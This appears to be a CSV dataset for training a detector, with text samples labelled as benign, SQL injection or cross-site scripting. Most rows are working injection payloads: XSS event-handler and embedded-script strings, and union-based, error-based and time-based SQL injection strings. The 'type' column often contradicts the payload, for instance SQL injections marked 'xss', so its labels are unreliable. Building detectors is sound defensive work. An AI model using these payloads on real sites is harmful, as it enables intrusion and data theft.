Text,Label,type
kara-lyn,0,sql
"<head oncopy=""alert(1)"" contenteditable>test</head>",2,xss
"<sub onclick=""alert(1)"">test</sub>",2,xss
"-4210""  )   where 2679  =  2679 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",1,xss
1 and 5934  =  7745,1,xss
SELECT * FROM chain WHERE butter LIKE '%way%',0,sql
<td onpointerup=alert(1)>XSS</td>,2,xss
"-7233""  )   where 7574  =  7574 or 5821  =  3288",1,sql
SELECT COUNT ( kill )  FROM atomic,0,sql
SELECT * FROM process WHERE eight = 'spell',0,xss
"1%""   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1,sql
"-1999  )   union all select 1779,1779,1779,1779,1779,1779,1779,1779,1779,1779#",1,sql
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1,sql
valdehorna,0,sql
"1   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,xss
SELECT * FROM beauty FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
1   )    )     )   and sleep  (  5  )  #,1,sql
piggott@firstchoicecoffee.gq,0,sql
 </li>,0,xss
SELECT * FROM income WHERE chapter = 'distant'  AND City = 'pleasant',0,sql
"<embed onbeforecut=""alert(1)"" contenteditable>test</embed>",2,xss
larixa,0,xss
<sup id=x tabindex=1 onfocus=alert(1)></sup>,2,xss
<nobr onpointerleave=alert(1)>XSS</nobr>,2,xss
<listing id=x tabindex=1 onfocus=alert(1)></listing>,2,xss
SELECT * FROM held WHERE continued = 'balloon'  AND  ( imagine = 'many' OR furniture = 'badly' ) ,0,xss
"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,xss
"<style>:target {color:red;}</style><br id=x style=""transition:color 1s"" ontransitionend=alert(1)></br>",2,xss
"<li><a href=""/wiki/Image_compression"" title=""Image compression"">Image compression </a> </li>",0,xss
thiessen,0,xss
zael,0,sql
<svg><slot onload=alert(1)></slot>,2,xss
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",2,xss
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1,sql
"<BGSOUND SRC=""javascript:alert('');"">",2,xss
"<form onmousedown=""alert(1)"">test</form>",2,xss
